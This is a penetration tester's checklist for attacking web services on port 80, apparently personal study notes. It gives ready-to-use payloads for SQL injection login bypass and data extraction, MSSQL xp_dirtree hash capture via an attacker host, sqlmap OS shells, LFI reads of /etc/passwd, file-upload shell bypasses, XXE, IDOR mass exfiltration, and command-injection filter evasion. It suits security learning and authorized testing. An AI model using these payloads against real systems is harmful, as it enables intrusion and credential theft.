#### 80 http

##### 1. Service Overview & Recon
- [ ] **Nmap Findings:**
	    
- [ ] **Nikto Scan:**
	    
- [ ] **Wappalyzer:**
    - [ ] Identify Tech Stack / Versions
	    
    - [ ] `searchsploit` / #`Google for "<Version> exploits" or "<Version> RCE"`
	    
##### 2. Manual Enumeration
- [ ] **Visual Inspection:** Visit website and poke around.
	    
- [ ] **Source Code Review:**
    
    - [ ] Inspect Page Source (comments, hidden inputs)
	        
    - [ ] `curl -s <target> | html2markdown` (Check for stripped comments)
			
- [ ] **Common Files & Directories:**
    
    - [ ] `/robots.txt`
	        
    - [ ] `/.htaccess` (Also via LFI/File Upload)
	        
    - [ ] `/.env`
	        
    - [ ] `/.git` (Use `git-dumper` if found)
	        
    - [ ] `/api/` (Try generic endpoints)
	        
- [ ] **Weird/Duplicate Pages:**
    
    - [ ] Check for `/old`, `/backup`, `/dev` versions of pages.
	        
    - [ ] Compare page sources of similar pages.
	        
- [ ] **Misc:**
	
	- [ ] Inspect Element for any masked characters that cover user passwords. The password MIGHT be in cleartext.
		
##### 3. Authentication & Portals

- [ ] **Default Credentials:**
    
    - [ ] `admin:admin` / `Admin:Admin`
	        
    - [ ] Check vendor documentation for default creds.
	        
- [ ] **Bypass Techniques:**
    
    - [ ] SQLi Login Bypass (Try `' OR 1=1 --`)
	        
    - [ ] Forgot Password Abuse
	        
- [ ] **Brute Force (Hydra):**
    
    - [ ] Wordlist: `rockyou.txt`
		    
    - [ ] Wordlist: local Kali repo of service (if it exists) 
		    
    - [ ] Wordlist: `cewl` (Custom wordlist from site content)
	        
    - [ ] Check for user/credential reuse from other services
	        

##### 4. Fuzzing & Discovery

- [ ] **Directory Brute-forcing ([[Feroxbuster]]):**
    
    - [ ] Standard Scan
	        
    - [ ] Extension Scan (`.sh`, `.php`, `.txt`, `.bak`) `# .sh = shellshock!`
	        
    - [ ] **Re-scan** manually identified directories.
		    
    - [ ] **Manual Directory Guessing (Last Resort):** Try directory names based on enumerated data (e.g., if the hostname or target is `sitebox`, try `http://<ip>/sitebox/`).
			
- [ ] **[[Domain Fuzzing]]: Subdomains and VHOSTs** 
    
    - [ ] `ffuf` / `wfuzz` (Check VHOSTs)
	        
    - [ ] _Reminder: Add subdomains to `/etc/hosts`_
	        
- [ ] **[[Parameter Fuzzing]]:**
    
    - [ ] Fuzz GET/POST parameters for hidden inputs.
			
    - [ ] Value Fuzzing
	        

##### 5. Vulnerability Specific Checks

###### SQL Injection ([[SQLi]]) - [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

- [ ] **1. Discovery & Validation**
    
    - [ ] Test EVERY input form (POST requests) and URL parameter (`?id=1`).
        
    - [ ] Inject single quote (`'`) to observe application behavior.
        
    - [ ] **Analyze Response:** - Look for verbose SQL syntax errors.
        
        - [ ] _Note: If a payload like `' or 1=1 in (select @@version) -- //` throws an error, but `'select @@version; -- //` returns "invalid credentials" or no output, the query may still be executing despite the lack of reflection._
            
- [ ] **2. Authentication Bypass (Login Forms)**
    
    - [ ] Test standard OR operators (Requires a valid username usually):
        
        - [ ] `<user>' or '1'='1`
            
    - [ ] Test comment truncation:
        
        - [ ] `<user>'--`
            
        - [ ] `' OR 1=1 -- //`
            
- [ ] **3. In-Band Enumeration**
    
    - [ ] **Error-Based Extraction:**
        
        - [ ] Version: `' or 1=1 in (select @@version) -- //`
            
        - [ ] Read columns: `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
            
    - [ ] **Union-Based Extraction:** (Requires matching column count and compatible data types)
        
        - [ ] _Determine Column Count:_ - [ ] `' ORDER BY 1-- //` (Increment until error)
            
            - [ ] `' UNION select 1,2,3,4 -- //` (Add/subtract until successful output)
                
        - [ ] _Enumerate Environment:_ - [ ] `%' UNION SELECT database(), user(), @@version, null, null -- //`
            
        - [ ] _Enumerate Schema:_ - [ ] `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //`
            
- [ ] **4. Blind SQLi** _(Consider scripting or SQLMap if these trigger)_
    
    - [ ] **Boolean-Based:** Observe if page content changes based on true/false statements.
        
        - [ ] `?user=admin' AND 1=1 -- //` (True)
            
        - [ ] `?user=admin' AND 1=2 -- //` (False)
            
    - [ ] **Time-Based:** Observe if the server hangs before responding.
        
        - [ ] `?user=admin' AND IF (1=1, sleep(3),'false') -- //`
            
- [ ] **5. MSSQL Specific Attacks (Hash Theft)**
    
    - [ ] Setup Responder on attacker machine: `sudo responder -I tun0`
        
    - [ ] Inject `xp_dirtree` payload to force an SMB authentication attempt to your machine:
        
        - [ ] `; EXEC master ..xp_dirtree '\\<attack_ip>\test'; --`
            
    - [ ] Capture Net-NTLMv2 hash and crack.
        
- [ ] **6. Automated (SQLMap)**
    
    - [ ] **Discovery & Crawling:**
        
        - [ ] `sqlmap -u <url> --forms --crawl=2`
            
    - [ ] **Targeted Parameter:**
        
        - [ ] `sqlmap -u http://<ip>/category?id=1 -p <parameter>`
            
    - [ ] **Data Extraction:**
        
        - [ ] Enumerate DBs: `sqlmap -u <url> -p <parameter> --dbs --batch`
            
        - [ ] Dump specific DB: `sqlmap -u <url> -p <parameter> -D <database> --dump`
            
    - [ ] **RCE / OS Shell:**
        
        - [ ] Save Burp POST request to `post.txt`.
            
        - [ ] `sqlmap -r post.txt -p <parameter> --os-shell --web-root "/var/www/html/tmp"`

###### File Inclusion (LFI/RFI)... 

- [ ] **Identification:**
    
    - [ ] URL Parameters: `?view=`, `?page=`, `?include=`
        
    - [ ] Test: `../../../../etc/passwd`
	    
- [ ] **Enumeration:**
    
    - [ ] Manual Traversal (config files, /etc/passwd, ssh keys, etc...)
	    
    - [ ] Read .php files (see [[PHP Wrappers]] File Disclosure)
	    
    - [ ] Automated Fuzzing (see [[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)|Local File Inclusion (LFI)]])
        
- [ ] **RCE Escalation:**
    
    - [ ] [[Remote File Inclusion (RFI)]]
        
    - [ ] [[LFI Log Poisoning]] (Apache/Auth logs)
        
    - [ ] [[PHP Wrappers]] (`expect://`, `php://input`)
        
    - [ ] [[LFI and File Uploads]] (Upload shell + include via LFI)
	    
###### File Upload Attacks ([[File Upload Attacks]])

- [ ] **1. Initial Upload & Client-Side Bypass**
    
    - [ ] Upload a raw shell (`shell.php`) to test baseline validation.
        
    - [ ] Inspect page source (CTRL+SHIFT+C) and delete client-side JS validation functions (e.g., `onchange="checkFile(this)"`).
        
- [ ] **2. Extension Filtering (Blacklists & Whitelists)**
    
    - [ ] **Fuzz Extensions:** Use Burp Intruder to test alternative extensions (`.php5`, `.phtml`, `.shtml`).
        
    - [ ] **Double Extensions:** Test `shell.jpg.php` (whitelist bypass) and `shell.php.jpg` (server misconfig bypass).
        
    - [ ] **Character Injection:** Fuzz injected characters like null bytes or spaces (`shell.php%00.jpg`, `shell.aspx:.jpg`).
        
- [ ] **3. Content & Type Validation (MIME & Magic Bytes)**
    
    - [ ] **Content-Type:** Intercept the upload request and change the header to `image/jpeg` or `image/png`.
        
    - [ ] **Magic Bytes:** Prepend legitimate image bytes (`GIF89a`) directly before the PHP payload.
        
    - [ ] _Note: Combine both Content-Type and Magic Bytes spoofing for best results._
        
- [ ] **4. Alternative Upload Vectors**
    
    - [ ] **Stored XSS:** Inject payloads into image metadata (`exiftool -Comment='"><script>alert(1)</script>' file.jpg`) or upload malicious `.svg` files.
        
    - [ ] **XXE:** Upload an `.svg` containing XML external entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`).
        
    - [ ] **Command Injection:** Inject bash commands directly into the filename (`file$(whoami).jpg`, `file.jpg||whoami`) if the application reflects it.
###### XXE Attacks ([[XXE Attacks]])

- [ ] **Discovery:** Verify XML parsing.
    
- [ ] **In-Band Exploitation:**
    
    - [ ] Local File Disclosure (`file:///etc/passwd`)
        
    - [ ] Source Code Disclosure (`php://filter`)
        
    - [ ] RCE (`expect://` - rare)
        
- [ ] **Blind / OOB Exploitation:**
    
    - [ ] Error-Based Exfiltration
        
    - [ ] Blind OOB (HTTP interaction)
        
    - [ ] CDATA Wrappers (Special characters)
        
- [ ] **Automated:**
    
    - [ ] XXEinjector
        
###### Insecure Direct Object References ([[IDOR]])

- [ ] **1. Identification & Parameter Testing**
    
    - [ ] Fuzz predictable URL parameters (e.g., `?uid=1` to `?uid=2`, `?filename=file_1.pdf` to `file_2.pdf`).
        
    - [ ] Inspect HTTP requests (GET/POST) and JSON bodies for hidden ID or UID fields.
        
    - [ ] Review front-end source code (specifically AJAX calls) to see how the application builds data requests and routes.
        
- [ ] **2. Bypassing Encoded References**
    
    - [ ] If parameters look like hashes, analyze the front-end JavaScript to identify the encoding/hashing logic (e.g., `CryptoJS.MD5(btoa(uid))`).
        
    - [ ] Replicate the client-side hashing logic locally (via bash or a script) to generate valid payload hashes for other UIDs.
        
- [ ] **3. Insecure API Exploitation**
    
    - [ ] **Information Disclosure:** Change IDs in `GET` requests to API endpoints (e.g., `/api.php/profile/2`) to leak target details like UUIDs, roles, or emails.
        
    - [ ] **Data Modification:** Send `PUT` or `POST` requests modifying the UID/UUID to alter another user's profile.
        
    - [ ] **Privilege Escalation:** Attempt to change role attributes (e.g., `"role": "web_admin"`) or cookies during profile update requests.
        
- [ ] **4. Mass Enumeration & Exfiltration**
    
    - [ ] Use Burp Intruder / ZAP Fuzzer to iterate through sequential IDs.
        
    - [ ] For heavy extraction, write a bash script using `curl`, `grep` (Regex), and `wget` to loop over parameters and automatically download exposed documents.

###### Command Injection ([[Command Injection]])

- [ ] **1. Operator Injection & Testing**
    
    - [ ] Test appending commands using standard shell operators:
        
        - [ ] `;` (Semicolon - Execute sequentially)
            
        - [ ] `&&` (AND - Execute if first succeeds)
            
        - [ ] `||` (OR - Execute if first fails)
            
        - [ ] `|` (Pipe - Pass output to next command)
            
        - [ ] `$()` or `` ` `` (Sub-shell execution - Linux only)
        
- [ ] **2. Space Filter Evasion**
    
    - [ ] **Tabs / Newlines:** Replace spaces with URL-encoded tabs (`%09`) or newlines (`%0a`).
        
    - [ ] **Environment Variables:** Use the Internal Field Separator (`$IFS`) in Linux: `127.0.0.1%0a${IFS}whoami`.
        
    - [ ] **Brace Expansion:** Execute without spaces using commas: `127.0.0.1%0a{ls,-la}`.
        
- [ ] **3. Blacklisted Character Evasion (`/`, `\`, `;`)**
    
    - [ ] **Linux Path Slicing:** Extract allowed characters from environment variables:
        
        - [ ] `/` bypass: `${PATH:0:1}`
            
        - [ ] `;` bypass: `${LS_COLORS:10:1}`
            
    - [ ] **Windows Path Slicing:** Extract `\` from the homepath: `%HOMEPATH:~6,-11%` (cmd) or `$env:HOMEPATH[0]` (powershell).
        
- [ ] **4. Blacklisted Command Evasion**
    
    - [ ] **Quote Insertion:** Break up the command string: `w'h'o'am'i` or `w"h"o"am"i`.
        
    - [ ] **Positional Parameters (Linux):** Insert `$@` or `\` into the command: `who$@ami` or `w\ho\am\i`.
        
    - [ ] **Caret Insertion (Windows):** Insert `^` into the command: `who^ami`.
        
    - [ ] **Command Reversal:** Reverse the string (e.g., `imaohw`) and execute the reversal: `$(rev<<<'imaohw')`.
        
    - [ ] **Base64 Encoding:** Encode the command and decode it during execution: `bash<<<$(base64 -d<<<d2hvYW1p)`.
        
- [ ] **5. Automated Obfuscation**
    
    - [ ] **Linux:** Use Bashfuscator (`./bashfuscator -c '<command>'`) to generate heavily mangled payloads.
        
    - [ ] **Windows:** Use Invoke-DOSfuscation to interactively generate obfuscated cmd/powershell payloads.

###### HTTP Verb Tampering ([[HTTP Verb Tampering]])

- [ ] Try `PUT`, `DELETE`, `HEAD` on restricted resources.
	

##### 6. Post-Exploitation / Review

- [ ] **Config Files:** Look for DB strings, API keys.
    
- [ ] **Hashes:**
    
    - [ ] Identify format
        
    - [ ] Crack (`john`, `hashcat`, `crackstation`)
        
- [ ] **Automated Scanners:**
    
    - [ ] `wpscan` (If WordPress)
        
    - [ ] `nikto` (Re-run with auth if possible)